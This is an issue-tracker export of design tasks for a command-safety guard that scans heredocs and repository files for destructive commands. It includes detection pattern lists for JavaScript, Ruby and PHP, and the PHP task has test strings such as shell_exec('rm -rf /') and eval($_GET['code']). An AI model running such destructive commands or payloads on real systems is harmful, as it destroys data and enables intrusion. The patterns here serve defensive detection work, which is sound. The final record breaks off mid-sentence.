{"id":"git_safety_guard-hcfg","title":"Add heredoc scanning configuration and CLI flags","description":"# Heredoc Scanning Configuration\n\n## Objective\n\nAllow users to configure heredoc scanning behavior via CLI flags and config file.\n\n## CLI Flags\n\n```\ndcg check [OPTIONS]\n\nHeredoc Scanning:\n    --heredoc-scan          Enable heredoc scanning (default: true)\n    --no-heredoc-scan       Disable heredoc scanning\n    --heredoc-timeout \u003cMS\u003e  Timeout for heredoc analysis (default: 50)\n    --heredoc-languages \u003cL\u003e Languages to scan (default: all)\n                            Values: python,bash,javascript,typescript,ruby,perl\n```\n\n## Config File (~/.config/dcg/config.toml)\n\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n\n# Graceful degradation\nfallback_on_parse_error = true  # Allow if parsing fails\nfallback_on_timeout = true       # Allow if timeout exceeded\n\n# Logging\nlog_heredoc_detection = false    # Log when heredocs detected\nlog_pattern_matches = false      # Log which patterns matched\n```\n\n## Pack Integration\n\nAdd heredoc scanning as a pack that can be enabled/disabled:\n\n```rust\n// In packs/heredoc.rs\npub fn create_pack() -\u003e Pack {\n    Pack {\n        id: \"heredoc\".to_string(),\n        name: \"Heredoc Scanning\",\n        description: \"Detect destructive patterns in inline scripts and heredocs\",\n        keywords: \u0026[\"\u003c\u003c\", \"-c\", \"-e\", \"python\", \"bash\", \"node\"],\n        safe_patterns: vec![],\n        destructive_patterns: vec![],  // Patterns defined per-language\n    }\n}\n```\n\n## Environment Variables\n\n- `DCG_HEREDOC_ENABLED=true|false`\n- `DCG_HEREDOC_TIMEOUT=50`\n- `DCG_HEREDOC_LANGUAGES=python,bash,javascript`\n\n## Default Behavior\n\n- Heredoc scanning: ENABLED by default\n- Timeout: 50ms\n- Languages: All supported\n- Fallback: Allow on error (fail-open for usability)\n\n## Test Cases\n\n- Verify --no-heredoc-scan skips heredoc detection\n- Verify timeout is respected\n- Verify language filtering works\n- Verify config file is loaded correctly\n- Verify environment variables override config","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-hcfg","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.542568801-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-jfj","title":"Design language detection heuristics","description":"# Design Language Detection Heuristics\n\n## Objective\nDesign reliable heuristics for determining the programming language of heredoc content.\n\n## Background\nTo scan heredoc content with ast-grep/tree-sitter, we need to know which language grammar to use. Language must be inferred from context clues.\n\n## Detection Sources (in priority order)\n\n### 1. Command Prefix (Most Reliable)\nMap command names to languages:\n- python, python3, python2 -\u003e Python\n- bash, sh, zsh, ksh -\u003e Bash\n- node, nodejs -\u003e JavaScript\n- ruby, irb -\u003e Ruby\n- perl -\u003e Perl\n- php -\u003e PHP\n\n### 2. Shebang Line (Heredoc Content)\nIf heredoc starts with #!, parse the interpreter:\n- #!/usr/bin/env python3 -\u003e Python\n- #!/bin/bash -\u003e Bash\n- #!/usr/bin/node -\u003e JavaScript\n\n### 3. File Extension in Command\nSome commands specify a language via temp file extension:\n- cat \u003e /tmp/script.py \u003c\u003c EOF -\u003e Python\n- This is less common but worth supporting\n\n### 4. Content Heuristics (Fallback)\nAnalyze content for language-specific patterns:\n- \"import \" at start of line -\u003e likely Python\n- \"function \" or \"const \" -\u003e likely JavaScript\n- \"def \" and \"end\" -\u003e likely Ruby\n- This is unreliable but better than nothing\n\n### 5. Configuration Override\nAllow users to specify default language for unknown heredocs.\n\n## Design Considerations\n\n### Ambiguity Handling\n- What if detection is uncertain?\n- Should we scan with multiple grammars?\n- Should we skip uncertain content?\n\n### Performance\n- Command prefix lookup should be O(1) hash map\n- Shebang detection is simple string parsing\n- Content heuristics should be bounded (first 10 lines)\n\n### Extensibility\n- Users should be able to add custom command-\u003elanguage mappings\n- New languages should be easy to add\n\n## Deliverables\n- Language detection algorithm specification\n- Command-to-language mapping table\n- Fallback strategy for unknown languages\n- Configuration schema for custom mappings\n\n## Success Criteria\n- Correctly identify language for 95%+ of real-world heredocs\n- Graceful degradation for unknown languages\n- Configuration mechanism for edge cases","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:39.984610362-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:39.984610362-05:00","dependencies":[{"issue_id":"git_safety_guard-jfj","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:45.118494749-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mcf","title":"Define JavaScript/Node destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous JavaScript/Node.js constructs within heredoc bodies.\n\n## Why This Matters\n\nNode.js heredocs (node -e, node \u003c\u003cEOF) are a significant attack vector because:\n1. Node has full filesystem and process access via built-in modules\n2. npm/npx can execute arbitrary packages\n3. child_process module provides shell execution capabilities\n\n## Pattern Categories to Define\n\n### Filesystem Operations\n- fs.rmSync, fs.rmdirSync with recursive option\n- fs.unlinkSync on critical paths\n- fs.writeFileSync overwriting system files\n- rimraf and similar destructive packages\n\n### Process Execution\n- child_process.exec, execSync, spawn, spawnSync\n- Commands piped to shell interpreters\n- process.kill on system processes\n\n### Dangerous Requires/Imports\n- require('child_process')\n- Dynamic requires with user input\n- import() with untrusted paths\n\n### Network Exfiltration\n- http/https requests to unknown endpoints\n- fs.readFileSync followed by network calls\n- Buffer manipulations for data encoding\n\n### Package Manager Abuse\n- Requiring packages that execute on install\n- npx with arbitrary package names\n- Global installs of untrusted packages\n\n## Implementation Notes\n\nJavaScript patterns need to handle:\n- CommonJS vs ES modules syntax\n- async/await patterns\n- Promise chains\n- Destructuring in imports\n- Template literals\n- eval() and Function() constructors\n\nUse tree-sitter-javascript for parsing. Consider typescript patterns separately.\n\n## Test Cases\n\nEach pattern needs tests for:\n- Various import styles (require, import, dynamic import)\n- Async vs sync API variants\n- Method chaining patterns\n- Callback vs Promise vs async/await styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:35:33.877595699-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:39.971741549-05:00","dependencies":[{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:39.990890431-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:40.010899112-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mvh","title":"Define Ruby destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Ruby constructs within heredoc bodies.\n\n## Why This Matters\n\nRuby heredocs are dangerous because:\n1. Ruby has powerful metaprogramming (eval, define_method, method_missing)\n2. Backticks and system() provide easy shell access\n3. FileUtils module has destructive filesystem operations\n4. Ruby's flexibility makes static analysis challenging\n\n## Pattern Categories to Define\n\n### Shell Execution\n- Backtick commands: `dangerous command`\n- system(), exec(), spawn() calls\n- %x{} syntax for shell commands\n- Open3 module usage\n- IO.popen for process execution\n\n### Filesystem Operations\n- FileUtils.rm_rf, FileUtils.remove_dir\n- File.delete, File.unlink\n- Dir.rmdir, Dir.delete\n- Pathname#rmtree\n\n### Metaprogramming Dangers\n- eval() and instance_eval\n- send() and public_send() with dynamic methods\n- define_method with external input\n- const_get with dynamic names\n- method_missing abuse\n\n### Kernel Methods\n- Kernel.exit!, Kernel.abort\n- Kernel.load, Kernel.require with dynamic paths\n- Kernel.fork and process manipulation\n\n### Data Exfiltration\n- Net::HTTP requests\n- open-uri with external URLs\n- Socket operations\n\n## Implementation Notes\n\nRuby parsing challenges:\n- Multiple string syntaxes (', \", %, heredocs)\n- Blocks and procs as arguments\n- Method calls without parentheses\n- Symbol to proc (\u0026:method_name)\n- Duck typing makes type inference hard\n\nUse tree-sitter-ruby for parsing.\n\n## Test Cases\n\nRuby-specific test cases:\n- Block syntax variations\n- Method chaining\n- Metaprogramming patterns\n- Different string quoting styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:18.506057604-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.473732741-05:00","dependencies":[{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:35.430025823-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:35.449812115-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-o15","title":"Design heredoc detection strategy","description":"# Design Heredoc Detection Strategy\n\n## Objective\nDesign a robust, performant strategy for detecting heredoc syntax in shell commands.\n\n## Background\nHeredocs appear in many forms across different shells and use cases. We need to detect when a command contains embedded script content that should be scanned for destructive patterns.\n\n## Heredoc Syntax Variants to Support\n\n### Bash/POSIX Shell\n- Basic: command \u003c\u003c DELIMITER ... DELIMITER\n- Quoted (no expansion): command \u003c\u003c 'DELIMITER' ... DELIMITER\n- Tab-stripped: command \u003c\u003c- DELIMITER ... DELIMITER\n- Here-string: command \u003c\u003c\u003c \"string\"\n\n### Other Shells\n- Zsh: same as bash plus \u003c\u003c~ for indentation stripping\n- Fish: different syntax entirely\n\n### Inline Scripts (not heredocs but similar)\n- Python -c \"code\"\n- node -e \"code\"\n- ruby -e \"code\"\n- perl -e \"code\"\n\n## Design Considerations\n\n### 1. Detection Approach\n- Regex-based quick check (fast, may have false positives)\n- Full parsing (accurate, slower)\n- Hybrid: regex for detection, parsing for extraction\n\n### 2. Content Extraction\n- How to correctly identify delimiter boundaries\n- Handling of quoted vs unquoted delimiters\n- Preservation of indentation for \u003c\u003c-\n\n### 3. Edge Cases\n- Nested heredocs\n- Heredocs in command substitution\n- Multiple heredocs in one command\n- Empty heredocs\n- Heredocs with special delimiters (containing quotes, spaces)\n\n### 4. Performance Budget\n- Detection should add \u003c 1ms to non-heredoc commands\n- Extraction should be \u003c 5ms for typical heredocs\n\n## Deliverables\n- Specification document with:\n  - Supported heredoc forms\n  - Detection algorithm\n  - Extraction algorithm\n  - Edge case handling\n  - Performance requirements\n\n## Success Criteria\n- Clear specification that can be implemented\n- Covers all common heredoc forms\n- Performance requirements are realistic and measurable\n\n## Dependencies\n- Benefits from ast-grep research (may inform approach)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:15.526903078-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:15.526903078-05:00","dependencies":[{"issue_id":"git_safety_guard-o15","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:24.626856626-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-perf","title":"Implement performance benchmarks for heredoc detection","description":"# Performance Benchmark Suite\n\n## Objective\n\nCreate benchmarks to measure and enforce performance budgets for heredoc detection.\n\n## Performance Budgets\n\n| Operation | Budget | Panic Threshold |\n|-----------|--------|----------------|\n| Tier 1 regex check | \u003c 10μs | \u003e 100μs |\n| Heredoc extraction | \u003c 500μs | \u003e 2ms |\n| Language detection | \u003c 50μs | \u003e 200μs |\n| AST parsing (small) | \u003c 2ms | \u003e 10ms |\n| AST parsing (large) | \u003c 10ms | \u003e 50ms |\n| Full pipeline | \u003c 15ms | \u003e 50ms |\n\n## Benchmark Implementation\n\nUsing criterion for statistical benchmarks:\n\n```rust\n// benches/heredoc_perf.rs\nuse criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};\n\nfn bench_tier1_regex(c: \u0026mut Criterion) {\n    let cases = [\n        (\"simple\", \"git status\"),\n        (\"heredoc_marker\", \"python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF\"),\n        (\"inline_script\", \"bash -c 'echo hello'\"),\n        (\"long_command\", \u0026\"x\".repeat(10000)),\n    ];\n    \n    let mut group = c.benchmark_group(\"tier1_regex\");\n    for (name, cmd) in cases {\n        group.bench_with_input(\n            BenchmarkId::new(\"might_contain_heredoc\", name),\n            cmd,\n            |b, cmd| b.iter(|| might_contain_heredoc(cmd)),\n        );\n    }\n    group.finish();\n}\n\nfn bench_full_pipeline(c: \u0026mut Criterion) {\n    // Benchmark complete heredoc check flow\n}\n\ncriterion_group!(benches, bench_tier1_regex, bench_full_pipeline);\ncriterion_main!(benches);\n```\n\n## Cargo.toml Addition\n\n```toml\n[[bench]]\nname = \"heredoc_perf\"\nharness = false\n\n[dev-dependencies]\ncriterion = \"0.5\"\n```\n\n## CI Integration\n\nAdd to CI pipeline:\n```yaml\n- name: Run benchmarks\n  run: cargo bench --bench heredoc_perf -- --noplot\n```\n\n## Regression Detection\n\nStore baseline and compare:\n```bash\n# Save baseline\ncargo bench --bench heredoc_perf -- --save-baseline main\n\n# Compare against baseline\ncargo bench --bench heredoc_perf -- --baseline main\n```\n\n## Test Data\n\nCreate fixtures:\n- `benches/fixtures/small_heredoc.txt` (10 lines)\n- `benches/fixtures/medium_heredoc.txt` (100 lines)  \n- `benches/fixtures/large_heredoc.txt` (1000 lines)\n- `benches/fixtures/real_world_samples/` (actual heredocs from the wild)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-perf","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.686523631-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-phpp","title":"Define PHP destructive patterns for heredoc scanning","description":"# PHP Destructive Patterns for Heredoc Scanning\n\n## Why PHP?\n\nPHP is common in web servers and often executed via:\n- `php -r 'code'`\n- `php \u003c\u003c 'EOF'`\n- Embedded in shell scripts for web automation\n\n## Pattern Categories\n\n### 1. Command Execution\n\n```php\n// Dangerous: Direct shell execution\nexec($CMD)\nshell_exec($CMD)\nsystem($CMD)\npassthru($CMD)\n`$CMD`  // backtick operator\nproc_open($CMD, $$$)\npopen($CMD, $MODE)\n\n// Dangerous: Eval\neval($CODE)\nassert($CODE)  // can execute code\ncreate_function($ARGS, $CODE)\npreg_replace('/.*/e', $CODE, $INPUT)  // /e modifier\n```\n\n### 2. File System Patterns\n\n```php\n// Dangerous: File deletion\nunlink($PATH)\nrmdir($PATH)\narray_map('unlink', glob($PATTERN))\n\n// Dangerous: Recursive operations\n// Custom recursive delete functions\nRecursiveDirectoryIterator + unlink\n\n// Dangerous: File operations\nfile_put_contents('/etc/$$$', $DATA)\nchmod($PATH, 0777)\nchown($PATH, 'root')\n```\n\n### 3. Include/Require Patterns\n\n```php\n// Dangerous: Dynamic includes\ninclude($VAR)\ninclude_once($VAR)\nrequire($VAR)\nrequire_once($VAR)\n\n// Dangerous: Remote includes (if allow_url_include=On)\ninclude('http://$$$')\ninclude('ftp://$$$')\n```\n\n### 4. Database Patterns\n\n```php\n// Dangerous: Raw SQL\nmysql_query(\"DROP $$$\")\nmysqli_query($CONN, \"DROP $$$\")\n$pdo-\u003equery(\"DROP $$$\")\n$pdo-\u003eexec(\"DROP $$$\")\n```\n\n## ast-grep Patterns\n\n```yaml\nid: php-shell-exec\nlanguage: php\nrule:\n  any:\n    - pattern: shell_exec($CMD)\n    - pattern: exec($CMD)\n    - pattern: system($CMD)\n    - pattern: passthru($CMD)\nmessage: \"Shell command execution detected\"\nseverity: error\n\nid: php-eval\nlanguage: php\nrule:\n  pattern: eval($CODE)\nmessage: \"Dynamic code evaluation detected\"\nseverity: error\n```\n\n## Test Cases\n\n```php\n// Should BLOCK\nshell_exec('rm -rf /');\neval($_GET['code']);\ninclude($user_input);\n\n// Should ALLOW\necho \"Hello World\";\n$result = 1 + 2;\n```\n\n## Dependencies\n\n- ast-grep-language must support PHP (tree-sitter-php)\n- Pattern library structure design","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-phpp","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:46.424057305-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-rbst","title":"Implement robustness and edge case handling for heredoc parsing","description":"# Robustness and Edge Case Handling\n\n## Objective\n\nEnsure heredoc detection handles all edge cases gracefully without crashing, hanging, or causing unexpected behavior.\n\n## Edge Cases to Handle\n\n### 1. Size Limits\n\n```rust\nconst MAX_HEREDOC_SIZE: usize = 1_000_000; // 1MB\nconst MAX_HEREDOC_LINES: usize = 10_000;\n\nfn extract_heredoc(cmd: \u0026str) -\u003e Result\u003cHeredocInfo, HeredocError\u003e {\n    let content = extract_content(cmd)?;\n    \n    if content.len() \u003e MAX_HEREDOC_SIZE {\n        tracing::warn!(size = content.len(), \"heredoc_too_large: skipping analysis\");\n        return Err(HeredocError::TooLarge { size: content.len() });\n    }\n    // ...\n}\n```\n\n### 2. Timeout Protection\n\n```rust\nuse std::time::{Duration, Instant};\n\nconst PARSE_TIMEOUT: Duration = Duration::from_millis(50);\n\nfn parse_with_timeout(content: \u0026str, lang: Language) -\u003e Result\u003cAst, ParseError\u003e {\n    let start = Instant::now();\n    \n    // Check timeout periodically during parsing\n    let ast = parse_internal(content, lang, || {\n        if start.elapsed() \u003e PARSE_TIMEOUT {\n            return Err(ParseError::Timeout);\n        }\n        Ok(())\n    })?;\n    \n    Ok(ast)\n}\n```\n\n### 3. Malformed Heredoc Handling\n\n```rust\nenum HeredocError {\n    MissingDelimiter,\n    UnterminatedHeredoc,\n    InvalidDelimiter { delimiter: String },\n    EncodingError,\n    TooLarge { size: usize },\n    TooManyLines { lines: usize },\n    Timeout,\n}\n\n// Graceful handling - fail-open for usability\nfn handle_heredoc_error(e: HeredocError) -\u003e CheckResult {\n    tracing::warn!(error = ?e, \"heredoc_parse_error: allowing command\");\n    CheckResult::allowed()\n}\n```\n\n### 4. Binary/Non-Text Content\n\n```rust\nfn is_likely_text(content: \u0026[u8]) -\u003e bool {\n    // Check for null bytes or high ratio of non-printable chars\n    let null_count = content.iter().filter(|\u0026\u0026b| b == 0).count();\n    let non_printable = content.iter().filter(|\u0026\u0026b| b \u003c 32 \u0026\u0026 b != b'\\n' \u0026\u0026 b != b'\\t').count();\n    \n    null_count == 0 \u0026\u0026 (non_printable as f64 / content.len() as f64) \u003c 0.1\n}\n\nfn extract_heredoc(cmd: \u0026str) -\u003e Result\u003cHeredocInfo, HeredocError\u003e {\n    let content = extract_content(cmd)?;\n    \n    if !is_likely_text(content.as_bytes()) {\n        tracing::debug!(\"binary_content_detected: skipping heredoc analysis\");\n        return Err(HeredocError::BinaryContent);\n    }\n    // ...\n}\n```\n\n### 5. Encoding Issues\n\n```rust\nfn normalize_encoding(content: \u0026[u8]) -\u003e Result\u003cString, HeredocError\u003e {\n    // Try UTF-8 first\n    if let Ok(s) = std::str::from_utf8(content) {\n        return Ok(s.to_string());\n    }\n    \n    // Try lossy conversion\n    let lossy = String::from_utf8_lossy(content);\n    tracing::debug!(\"non_utf8_content: using lossy conversion\");\n    Ok(lossy.into_owned())\n}\n```\n\n### 6. Multiple Heredocs\n\n```rust\nstruct MultiHeredoc {\n    heredocs: Vec\u003cHeredocInfo\u003e,\n}\n\nfn extract_all_heredocs(cmd: \u0026str) -\u003e Vec\u003cHeredocInfo\u003e {\n    let mut heredocs = vec![];\n    let mut remaining = cmd;\n    \n    while let Some((heredoc, rest)) = extract_next_heredoc(remaining) {\n        heredocs.push(heredoc);\n        remaining = rest;\n        \n        // Limit to prevent DoS\n        if heredocs.len() \u003e= 10 {\n            tracing::warn!(\"too_many_heredocs: stopping at 10\");\n            break;\n        }\n    }\n    \n    heredocs\n}\n```\n\n### 7. Nested Heredocs\n\n```rust\n// Detect heredoc inside heredoc (rare but possible)\nfn detect_nested_heredocs(content: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(content)\n}\n\nfn analyze_heredoc(info: \u0026HeredocInfo) -\u003e Vec\u003cPatternMatch\u003e {\n    let mut matches = match_patterns(\u0026info.content, info.language);\n    \n    // Check for nested heredocs\n    if detect_nested_heredocs(\u0026info.content) {\n        tracing::debug!(\"nested_heredoc_detected\");\n        // Recursively analyze? Or just flag it?\n        matches.push(PatternMatch {\n            pattern_name: \"nested_heredoc\".to_string(),\n            reason: \"Heredoc contains another heredoc which may hide commands\".to_string(),\n            severity: Severity::Warn,\n            ..Default::default()\n        });\n    }\n    \n    matches\n}\n```\n\n## Test Cases\n\n```rust\n#[test]\nfn test_oversized_heredoc() {\n    let large_content = \"x\".repeat(2_000_000);\n    let cmd = format!(\"python3 \u003c\u003c 'EOF'\\n{}\\nEOF\", large_content);\n    assert!(extract_heredoc(\u0026cmd).is_err());\n}\n\n#[test]\nfn test_binary_content() {\n    let cmd = \"cat \u003c\u003c 'EOF'\\n\\x00\\x01\\x02binary\\nEOF\";\n    assert!(extract_heredoc(cmd).is_err());\n}\n\n#[test]\nfn test_multiple_heredocs() {\n    let cmd = \"python3 \u003c\u003c 'A'\\ncode1\\nA\\nbash \u003c\u003c 'B'\\ncode2\\nB\";\n    let heredocs = extract_all_heredocs(cmd);\n    assert_eq!(heredocs.len(), 2);\n}\n```\n\n## Performance Impact\n\nThese checks add minimal overhead:\n- Size check: O(1)\n- Binary check: O(n) but early exit\n- Timeout: Checked periodically, not per-byte","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:46:02.228572246-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:47:10.592550683-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan","title":"Epic: Repo scanning + integrations (pre-commit/CI)","description":"# Epic: Repo scanning + integrations (pre-commit/CI)\n\n## Why this epic exists\n\nThe hook protects *interactive* command execution, but teams also need protection against destructive commands that get **committed into repositories**:\n\n- CI workflows (`run:` steps) that include dangerous commands\n- Dockerfiles (`RUN`) that include irreversible operations\n- shell scripts and Makefiles that do destructive cleanup\n- Terraform provisioners that run destructive shell\n\nCatching these in review (pre-commit/CI) prevents incidents and makes `dcg` feel like a serious, team-scale safety layer.\n\nCrucially, this must be done **without creating new false positives** that annoy users at org scale.\n\n## Goals\n\n1. Implement `dcg scan` that extracts **executable command contexts** from files and evaluates them using the **same shared evaluator** as hook/CLI.\n2. Provide pre-commit and CI workflows that are \"warn-first\" and configurable (`--fail-on error|warning|none`).\n3. Produce high-quality, actionable output:\n   - stable rule IDs (`pack_id:pattern_name`)\n   - file:line[:col] locations\n   - short reason + optional suggestion\n4. Keep performance bounded:\n   - scan only changed files by default in CI\n   - cap file size and number of findings\n\n## Non-goals (initially)\n\n- Building a full static-analysis engine for arbitrary languages.\n- Grepping entire repos by default.\n\n## Safety constraints\n\n- Scanners must be extractor-based, not naive substring grep.\n- Scanner output must make it obvious what is **executed** vs **documentation**.\n- Default behavior should be conservative (warn-first rollout), with hard-fail only for high-confidence catastrophic rules.\n\n## Acceptance criteria (epic-level)\n\n- `dcg scan --staged` works locally and reports actionable findings.\n- A minimal GitHub Actions workflow can run `dcg scan` on PR diffs and surface results.\n- Unit tests cover extractor correctness for all MVP file types.\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T20:47:37.075199813-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:47:37.075199813-05:00"}
{"id":"git_safety_guard-scan.1","title":"Design: dcg scan extraction model + output schema","description":"## Objective\n\nDefine the extraction model, CLI surface area, and output schema for `dcg scan` so implementation is coherent and testable.\n\n## Background\n\nRepo scanning is where false positives can explode:\n\n- YAML contains lots of strings; only some are executed.\n- Dockerfiles have multiple instruction forms; only some invoke a shell.\n- Makefiles have recipes, variables, and docs.\n\nIf we design output + extraction boundaries up front, we can be conservative and predictable.\n\n## Proposed `dcg scan` UX (v1)\n\n### Commands\n\n- `dcg scan --staged`\n- `dcg scan --paths \u003cpath\u003e...`\n- `dcg scan --git-diff \u003crev-range\u003e` (CI/PR default)\n\n### Output\n\n- `--format pretty|json`\n- Findings include:\n  - `file`, `line`, optional `col`\n  - `extractor_id` (e.g., `github-actions.run`, `dockerfile.run`)\n  - `extracted_command` (possibly truncated)\n  - `decision` (allow|warn|deny)\n  - `rule_id` (`pack_id:pattern_name`) when matched\n  - `reason`\n  - optional `suggestion`\n\n### Policy knobs\n\n- `--fail-on error|warning|none` (maps to deny/warn/info)\n- `--max-file-size` (default 1MB)\n- `--max-findings` (default 50)\n- `--exclude` glob patterns\n- `--redact` (redact quoted strings or long args)\n\n## Extraction contract\n\nEach extractor returns a list of `ExtractedCommand`:\n\n- `{ file, line, col?, kind, command, metadata }`\n- `kind` identifies an *execution context* (not a doc string).\n\nThis is intentionally the same philosophy as the execution-context classifier for command lines:\n\n- Be explicit about what is executed.\n- Everything else is data.\n\n## MVP file types (must be covered)\n\n- `.sh` (shell script)\n- `Dockerfile` (`RUN` shell form)\n- GitHub Actions workflow YAML (`steps[].run`)\n- `Makefile` recipe lines\n\n## Acceptance criteria\n\n- Output schema is stable enough to write golden tests.\n- Extractor boundaries are conservative and clearly documented.\n- Design here maps cleanly to a small set of Rust structs/enums.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:48:32.372701532-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:48:32.372701532-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.1","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:45.283494893-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2","title":"Implement dcg scan CLI + file selection","description":"## Objective\n\nImplement the `dcg scan` CLI surface area and file-selection logic.\n\nThis task is about:\n\n- parsing args (`--staged`, `--paths`, `--git-diff`)\n- selecting candidate files safely and predictably\n- calling extractors and aggregating findings\n\nIt is *not* about the detailed extractors themselves (that is a separate task).\n\n## Requirements\n\n### CLI\n\n- Add a `scan` subcommand with:\n  - `--staged` (scan the git index)\n  - `--paths \u003cpaths...\u003e` (scan explicit paths)\n  - `--git-diff \u003crev-range\u003e` (scan files changed in a diff)\n  - `--format pretty|json`\n  - `--fail-on error|warning|none`\n  - `--max-file-size`, `--max-findings`, `--exclude`, `--redact`\n\n### File selection rules\n\n- `--staged` should use `git diff --cached --name-only` (no content parsing via shell; prefer libgit2/gix later if we want).\n- `--git-diff` should use `git diff --name-only \u003crev-range\u003e`.\n- Paths should be filtered by:\n  - file size cap\n  - ignore common vendor dirs (`target/`, `node_modules/`, etc.) unless explicitly included\n\n### Output\n\n- Pretty format groups findings by file.\n- JSON format is a stable schema suitable for CI.\n\n### Error handling\n\n- Missing git repo / git failure should be a clear error for `--staged`/`--git-diff`.\n- Non-existent paths should be a clear error.\n- If extractor fails on a file, we should report an error finding but **not** crash.\n\n## Acceptance criteria\n\n- Running `dcg scan --paths scripts/e2e_test.sh --format json` produces valid JSON (even if no findings).\n- `dcg scan --staged` runs in a git repo and produces deterministic file order.\n- Unit tests exist for argument parsing and path filtering.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:10.881718777-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:10.881718777-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:59.364769611-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3","title":"Implement MVP extractors (shell, Dockerfile, GitHub Actions, Makefile)","description":"## Objective\n\nImplement the first set of conservative, high-signal extractors for `dcg scan`.\n\n## Guiding principle\n\nOnly extract **executable contexts**. Avoid extracting from fields that are obviously documentation.\n\nThis task should explicitly encode these boundaries so false positives don't explode.\n\n## MVP extractors\n\n### 1) Shell scripts (`*.sh`)\n\n- Extract candidate command lines from scripts.\n- Keep it conservative:\n  - ignore pure comments\n  - ignore blank lines\n  - treat each non-comment line as a candidate command line (we're not interpreting variables)\n- Long term improvement (not required for v1): handle multiline `\\` continuations.\n\n### 2) Dockerfile\n\n- Extract `RUN \u003cshell form\u003e` lines.\n- Ignore JSON-array exec-form `RUN [\"cmd\", ...]` for v1 unless we add a tiny parser.\n- Do NOT scan comments or `LABEL`/`ENV`/`ARG` values.\n\n### 3) GitHub Actions workflow YAML\n\n- Extract only `steps[].run` (string or block scalar).\n- Explicitly ignore:\n  - `name:` fields\n  - `env:` values\n  - `with:` values\n  - docs/comments\n\n### 4) Makefile\n\n- Extract recipe lines (tab-indented).\n- Handle `\\` continuation for adjacent recipe lines.\n- Ignore variable definitions and comments.\n\n## Output requirements\n\nEach extracted command must include:\n\n- `file`, `line`, optional `col`\n- `extractor_id`\n- the extracted command string\n\n## Tests\n\n- Unit tests per extractor with minimal fixtures:\n  - confirm *only* execution contexts are extracted\n  - confirm correct line numbers\n  - regression tests for common tricky cases (YAML block scalars, Makefile continuations)\n\n## Acceptance criteria\n\n- The extractors can be run on representative sample files without panicking.\n- Unit tests demonstrate the extractor boundaries (no docs strings).\n- Extracted commands are deterministic and stable for golden 